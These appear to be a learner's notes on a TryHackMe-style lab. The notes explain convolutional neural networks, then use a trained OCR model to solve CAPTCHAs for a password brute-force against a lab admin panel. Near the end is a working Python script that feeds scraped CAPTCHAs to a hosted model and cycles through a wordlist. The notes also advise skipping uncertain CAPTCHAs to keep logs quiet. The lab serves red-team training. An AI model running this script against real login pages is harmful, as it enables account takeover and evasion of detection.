## Table of Contents

  - [Table of Contents](#Table\of\Contents)
          - [Key Terms](#Key\Terms)
          - [Objectives](#Objectives)
          - [Takeaways](#Takeaways)
  - [Convolutional Neural Networks](#Convolutional\Neural\Networks)
      - [Feature Extraction](#Feature\Extraction)
    - [Image representation](#Image\representation)
      - [Convolution](#Convolution)
          - [Pooling](#Pooling)
        - [Fully Connected Layers](#Fully\Connected\Layers)
        - [Classification](#Classification)
      - [Gather Training Data](#Gather\Training\Data)
          - [Creating the Training dataset](#Creating\the\Training\dataset)
    - [Hosting Our CNN Model](#Hosting\Our\CNN\Model)
    - [Brute Forcing the Admin Panel](#Brute\Forcing\the\Admin\Panel)

## Table of Contents

          - [Key Terms](#Key\Terms)
          - [Objectives](#Objectives)
          - [Takeaways](#Takeaways)
  - [Convolutional Neural Networks](#Convolutional\Neural\Networks)
      - [Feature Extraction](#Feature\Extraction)
    - [Image representation](#Image\representation)
      - [Convolution](#Convolution)
          - [Pooling](#Pooling)
        - [Fully Connected Layers](#Fully\Connected\Layers)
        - [Classification](#Classification)
      - [Gather Training Data](#Gather\Training\Data)
          - [Creating the Training dataset](#Creating\the\Training\dataset)
    - [Hosting Our CNN Model](#Hosting\Our\CNN\Model)
    - [Brute Forcing the Admin Panel](#Brute\Forcing\the\Admin\Panel)

###### Key Terms
- **Linear Algebra** - Convolutional Neural Networks (*CNN*s)
	- **Role**: Linear algebra forms the backbone of *CNN*s by facilitating operations like convolution, transformations, and optimizations. For example, matrix multiplication is used to apply filters (kernels) across images, enabling feature extraction and pattern recognition.

	- **Example**: In a *CNN*, an image (matrix of pixel values) is convolved with a filter (smaller matrix) using element-wise multiplication and summation, extracting features like edges and textures crucial for image classification tasks.

	- **CNN** - Convolutional Neual Network 
###### Objectives
- Understanding complex neural network structures
- How does a convolutional neural network function
- How to use neural networks for optical character recognition
- Integrating neural networks into red team tooling
###### Takeaways
Once a CNN has been trained, we can export the weights of the different nodes. This allows us to recreate the trained network at any time.
## Convolutional Neural Networks
- Have the ability to extract features that can be used to train a neural network. In the previous task, we used *garbage-in*, and *garbage-out* 
CNNs are normal neural networks that simply have the feature-extraction process as part of the network itself. This is done through **Linear Algebra**
#### Feature Extraction

CNNs are often used to classify images. While we can use them with almost any data type, images are the simplest for explaining how a CNN works. This is the CAPTCHA that we are trying to crack:

![Single CAPTCHA](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/df5f79a5c532446cd5ecc22b65868427.png)  

Since we’ll be using a CNN to crack CAPTCHAs, let’s use a single letter in the CAPTCHA as our image:

![Single CAPTCHA letter](https://tryhackme-images.s3.amazonaws.com/user-uploads/62c435d1f4d84a005f5df811/room-content/4a220e125d3a3200edc8a7bedf1c0a11.png)


### Image representation
First question to answer is how the the CNN structure actually perceive this image? Simplest way for a computer to perceive an image is as a 2D array of pixels. A pixel is the smallest area that can be measured in an image. Together, these pixels are what create the image. A pixel's value describes the colour that you are seeing
- **RGB**: The pixel is represented by thee numbers from `(0-255)` `(RRR, GGG, BBB)` whereas each letter represents a digit.
	- These numbers can also be in hexadecimal 
- **Greyscale**: The pixel is represented by a single number from `(0-255)`. 0 means the pixel is fully black, and 255 means the pixel is fully white. Any value in between is a shade of grey


#### Convolution
There are two steps in the CNN feature extraction process:
1. Convolution
	- Reduce the size of the input (I.e., the input in which the neural network draws attention to). 
	- The kernel matrix is a smalled 2D array that tells us where in the image we are currently creating our summary. This kernel slides across the height and width of the image to create a summary image
		Ex: Start at the top-left of the image and continue to evaluate the image's pixel in 3x3 sections. Calculating the summary by multiplying  each pixel with the value in the kernel. These kernel values can be set differently for different feature extractions, although you aren't limited to a single run. The values of these kernels are usually randomised at the start and then updated as the network is busy training. We say that each kernel run will create a summary slice. 

###### Pooling
The second step performed in the **CNN** feature extraction is pooling. Similar to convolution, the pooling step aims to further summarise the data using a statistical method. Ex:
```
--------------
A7 C0 | D1 E9|          
17 AF | CE 25|                                           -----
------|------|--->   |Max pool with 2x2 filters | ----> |C0|E9|
9A 5B | F9 2B|--->   |and a stride 2            | ----> |9A|F9|
0F 2E | DA 2B|                                           -----
--------------
```

for each kernel as you can see, we create a summary based on statistics. In this case, it split's the byte's into a 4x4 grid

##### Fully Connected Layers
Now that our features our together, all we need to do next is put together the basic neural network that takes inputs (the summary slices from our last pooling layer), run them from the hidden layers, and then finally provide an output. This is called the fully connected layers portion of the **CNN**

##### Classification
The classification portion of the CNN, This is the output layer from the fully connected layers portion. In the previous tasks, our neural networks only had one output to determine whether or not a toy was defective or whether or not an email was a phishing email. To track CAPTCHAs, a simple binary output won't do. We need an output node for each potential character in order to potentially get the correct results. 

In this example, the CAPTCHAs are only numbers and letters, so therefore we will only need an output node for 0-9, and each potential character.

- All 26 outputs then have a decimal value between 0 and 1. We'll then summarise this by taking the highest value as the answer from the network


We will be making use of the [Attention OCR](https://github.com/emedvedev/attention-ocr) for our CNN model.
This CNN structure has a lot more going on, such as LSTMs and sliding windows, but we won’t dive deeper into these steps in this instance
- Only thing to note is that we have a sliding window which allows us to read one character at a time instead of having to solve the entire CAPTCHA in one go.

We’ll be making use of the same steps followed to create [CAPTCHA22](https://github.com/WithSecureLabs/captcha22), which is a Python Pip package that can be used to host a CAPTCHA-cracking server. If you’re interested in understanding how this works, you can have a read [here](https://labs.withsecure.com/publications/releasing-the-captcha-cracken)

These are the following steps needed for using machine learning to crack CAPTCHAs:
1. Gather CAPTHAs so we can create labelled data
2. Label the CAPTCHAs to use in a supervised learning model
3. Train our CAPTCHA-cracking CNN
4. Export and host the trained model so we can feed it CAPTCHAs to solve
5. Create and execute a brute force script that will receive the CAPTCHA, pass it on to be solved, then run the brute force attack.


To do this, you have to start the Docker container. In a terminal window, execute the following command:

`docker run -d -v /tmp/data:/tempdir/ aocr/full`
This starts a docker container that has TensorFlow and AOCR already installed for you. You will need to connect to this container for the next few steps. Fires, you'll need to find the container's ID using the following:
```bash
docker ps
```
Take note of the Container's ID and then run the following:
```bash
docker exec -it CONTAINER_ID /bin/bash
#this will connext you to the container with a bash shell
cd /ocr/
```


#### Gather Training Data
In order to train our CAPTCHA-cracking CNN, we first have to create a dataset that can be used for training. For exemplary purposes:
n [http://hqadmin.thm:8000](http://hqadmin.thm:8000/) in a browser window in the VM and you’ll see the following authentication page:

![Website Authentication Page](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/11e2e40c96b1fd5a56adb356000149a1.png)


The authentication portal embeds a CAPTCHA image. We can get the raw image using a simple cURL command from a normal terminal window:
`curl http://hqadmin.thm:8000/`
![[Pasted image 20231216143600.png]]
The output will be the base64 encoded version of the CAPTCHA image. Write a script that will download this  image then prompt us to provide the answer for the CPATCHA to store in a training dataset. This has already been done for you, you can view the stored data using the following command in the Docker container:
`ls -alh raw_data/dataset/`

###### Creating the Training dataset
We need to create the training dataset in a format that AOCR can use. This requires us to create a simple text file that lists the path for each CAPTCHA and the correct answer. A script was used to create this text file can be found under the `labeling` directory.

Once we have our text file, it has to be converted into a TensorFlow record that can be used for training. This has already been done for you, but you can use the following command to create the dataset:

`aocr dataset ./labels/training.txt ./training.tfrecords`

- Loss: Loss is the CNN's prediction error. The closer the value is to 0, the smaller our prediction error. If you were to start training from scratch, the loss value would be incredibly high for the first couple of rounds until the network is trained
- Perplexity: Perplexity refers to how uncertain the CNN is in its prediction. The close the value is to 1, the moire certain the CNN is that its prediction is correct. Consider how "perplexed" the CNN would be seeing the image for the first time; seeing something new would be perplexing but as the network becomes more familiar with the images/dataset it is provided and trained with, it will slowly become more familiar with the expected and provided results that it provides. Any value below 1.005 would be considered a trained (or overtrained) CNN


As the CNN has already been trained for you, you can now test the CNN by running:

`aocr test testing.tfrecords`

Testing will now begin! Once a couple of testing steps are complete, you can stop it once again using `Ctrl+C`. Let’s take a look at two of the lines:

Terminal

```shell
2023-10-24 06:02:14,623 root  INFO     Step 19 (0.079s). Accuracy: 100.00%, loss: 0.000448, perplexity: 1.00045, probability: 99.73% 100% (37469)
2023-10-24 06:02:14,690 root  INFO     Step 20 (0.066s). Accuracy: 99.00%, loss: 0.673766, perplexity: 1.96161, probability: 97.93%  80% (78642 vs 78542)
```

From the output you can see the testing timestamp, running a single image sample through the **CNN** is significantly faster than training it on the entire dataset. This is one of the true advantages of neural networks. Once training has been completed, the network is usually quick to provide a prediction. As we can see from the predictions provided at the end of the lines, one of the CAPTCHA predictions was completely correct, whereas another was a prediction error, mistaking a 5 for a 6.


By comparing the loss and perplexity values of the two samples, you will see that the CNN is uncertain about its answer. We can actually use this to our advantage when performing live predictions. We can create a discrepancy between CAPTHCA prediction accuracy and CAPTCHA submission accuracy simply by not submitting the CAPTCHAs that we are too uncertain about. Instead, we can request a new CAPTCHA. This enables us to change the OpSec of our attack, as the logs won't show a significant amount of entries for incorrect CAPTCHA submissions.


### Hosting Our CNN Model

Now that we’ve trained our CNN, we’ll need to host the CNN model to send it CAPTCHAs through our brute forcing script. For this, we will use [TensorFlow Serving](https://github.com/Tensorflow/serving).

Once a CNN has been trained, we can export the weights of the different nodes. This allows us to recreate the trained network at any time. An export of the trained CNN has already been created for you under the `/ocr/model/` directory. We’ll now export that model from the Docker container using the following command:

`cd /ocr/ && cp -r model /tempdir/`

Once that’s complete, you can exit the Docker container terminal (use the `exit` command) and kill it using the following command (you can reuse `docker ps` to get the container ID):

`docker kill CONTAINER_ID`

TensorFlow serving will run in a docker container, This will expose the API that we will then use to interface with the hosted model to send it a CAPTCHA prediction. You can start the Serving container using the following command:
```bash
docker run -t --rm -p 8501:8501 -v /tmp/data/model/exported-model:/models/ -e MODEL_NAME=ocrtensorflow/serving
```


this can be accessed via the URL: `http://localhost:8501/v1/models/ocr/`

### Brute Forcing the Admin Panel

```python
```python
#Import libraries
import requests
import base64
import json
from bs4 import BeautifulSoup

username = "admin"
passwords = []

#URLs for our requests
website_url = "http://hqadmin.thm:8000"
model_url = "http://localhost:8501/v1/models/ocr:predict"

#Load in the passwords for brute forcing
with open("passwords.txt", "r") as wordlist:
    lines = wordlist.readlines()
    for line in lines:
        passwords.append(line.replace("\n",""))


access_granted = False
count = 0

#Run the brute force attack until we are out of passwords or have gained access
while(access_granted == False and count < len(passwords)):
    #This will run a brute force for each password
    password = passwords[count]

    #First, we connect to the webapp so we can get the CAPTCHA. We will use a session so cookies are taken care of for us
    sess = requests.session()
    r = sess.get(website_url)
    
    #Use soup to parse the HTML and extract the CAPTCHA image
    soup = BeautifulSoup(r.content, 'html.parser')
    img = soup.find("img")    
    encoded_image = img['src'].split(" ")[1]
    
    #Build the JSON request to send to the CAPTCHA predictor
    model_data = {
        'signature_name' : 'serving_default',
        'inputs' : {'input' : {'b64' : encoded_image} }
        }
        
    #Send the CAPTCHA prediction request and load the response
    r = requests.post(model_url, json=model_data)
    prediction = r.json()
    probability = prediction["outputs"]["probability"]
    answer = prediction["outputs"]["output"]

    #We can increase our guessing accuracy by only submitting the answer if we are more than 90% sure
    if (probability < 0.90):
        #If lower than 90%, no submission of CAPTCHA
        print ("[-] Prediction probability too low, not submitting CAPTCHA")
        continue

    #Otherwise, we are good to go with our brute forcer
    #Build the POST data for our brute force attempt
    website_data = {
            'username' : username,
            'password' : password,
            'captcha' : answer,
            'submit' : "Submit+Query"
            }

    #Submit our brute force attack
    r = sess.post(website_url, data=website_data)

    #Read the response and interpret the results of the brute force attempt
    response = r.text

    #If the response tells us that we submitted the wrong CAPTCHA, we have to try again with this password
    if ("Incorrect CAPTCHA value supplied" in response):
        print ("[-] Incorrect CAPTCHA value was supplied. We will resubmit this password")
        continue
    #If the response tells us that we submitted the wrong password, we can try with the next password
    elif ("Incorrect Username or Password" in response):
        print ("[-] Invalid credential pair -- Username: " + username + " Password: " + password)
        count += 1
    #Otherwise, we have found the correct password!
    else:
        print ("[+] Access Granted!! -- Username: " + username + " Password: " + password)
        access_granted = True
```

What key process of training a neural network is taken care of by using a CNN?
**feature extraction**

What is the name of the process used in the CNN to extract the features?
**convolution**

What is the name of the process used to reduce the features down?
**pooling**

What off-the-shelf CNN did we use to train a CAPTCHA-cracking OCR model?
****








































































